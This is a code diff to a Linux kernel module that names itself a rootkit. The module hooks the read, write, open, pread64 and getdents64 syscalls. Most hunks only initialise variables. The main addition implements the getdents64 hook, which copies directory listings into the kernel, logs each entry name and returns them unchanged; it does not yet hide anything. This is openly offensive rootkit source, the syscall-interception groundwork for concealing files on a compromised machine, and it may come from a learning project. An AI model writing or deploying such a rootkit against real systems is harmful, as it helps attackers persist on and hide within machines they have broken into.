@@ -22,7 +22,7 @@ MODULE_VERSION("0.1");
 
 static int __init rootkit_init(void)
 {
-    int i_err;
+    int i_err = 0;
 
     // Initialize hooking
     i_err = init_hooking();
@@ -50,9 +50,9 @@ static __exit void rootkit_exit(void)
 SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                       sz_count)
 {
-    long l_err;
-    long l_ret;
-    char *s_data;
+    long l_err   = 0;
+    long l_ret   = 0;
+    char *s_data = NULL;
 
     pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
@@ -80,8 +80,8 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
 SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                       size_t, sz_count)
 {
-    long l_err;
-    char *s_data;
+    long l_err   = 0;
+    char *s_data = NULL;
 
     pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
@@ -107,8 +107,8 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
-    long l_err;
-    char *s_filename_k;
+    long l_err         = 0;
+    char *s_filename_k = NULL;
 
     s_filename_k = (char *)kvmalloc(PATH_MAX, GFP_KERNEL);
 
@@ -133,9 +133,9 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                       size_t, sz_count, loff_t, i64_pos)
 {
-    long l_err;
-    long l_ret;
-    char *s_data;
+    long l_err   = 0;
+    long l_ret   = 0;
+    char *s_data = NULL;
 
     pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);
 
@@ -179,9 +179,58 @@ SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
 SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                       struct linux_dirent64 __user *, p_dirent, unsigned int, ui32_count)
 {
+    long l_ret = 0; // Return value of the real syscall
+    long l_err = 0; // Error code of the copy functions
+
+    struct linux_dirent64 *p_dirent_k    = NULL; // Kernel buffer
+    struct linux_dirent64 *p_dirent_k_it = NULL; // Kernel buffer iterator
+
     pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
 
-    return orig_getdents64(p_regs);
+    l_ret = orig_getdents64(p_regs);
+    if (l_ret <= 0) {
+        // No entries or error, return immediately
+        if (l_ret == 0) {
+            pr_info("[ROOTKIT] * No entries");
+        } else {
+            pr_err("[ROOTKIT] * Error: %ld", l_ret);
+        }
+        return l_ret;
+    }
+
+    p_dirent_k = (struct linux_dirent64 *)kzalloc(l_ret, GFP_KERNEL);
+
+    if (p_dirent_k == NULL) {
+        pr_err("[ROOTKIT] * Could not allocate memory");
+        return l_ret;
+    }
+
+    // Copy data from user to kernel
+    l_err = copy_from_user(p_dirent_k, p_dirent, l_ret);
+
+    if (l_err != 0) {
+        pr_err("[ROOTKIT] * Could not copy data from user");
+        kfree(p_dirent_k);
+        return l_ret;
+    }
+
+    pr_info("[ROOTKIT] * Entries:");
+
+    p_dirent_k_it = p_dirent_k;
+    while ((char *)p_dirent_k_it < (char *)p_dirent_k + l_ret) {
+        pr_info("[ROOTKIT]   * %s", p_dirent_k_it->d_name);
+        p_dirent_k_it = (struct linux_dirent64 *)((char *)p_dirent_k_it + p_dirent_k_it->d_reclen);
+    }
+
+    // Copy data back to user
+    l_err = copy_to_user(p_dirent, p_dirent_k, l_ret);
+
+    if (l_err != 0) {
+        pr_err("[ROOTKIT] * Could not copy data back to user");
+    }
+
+    kfree(p_dirent_k);
+    return l_ret;
 }
 
 SYSCALL_HOOK_HANDLER0(getpid, orig_getpid, p_regs)
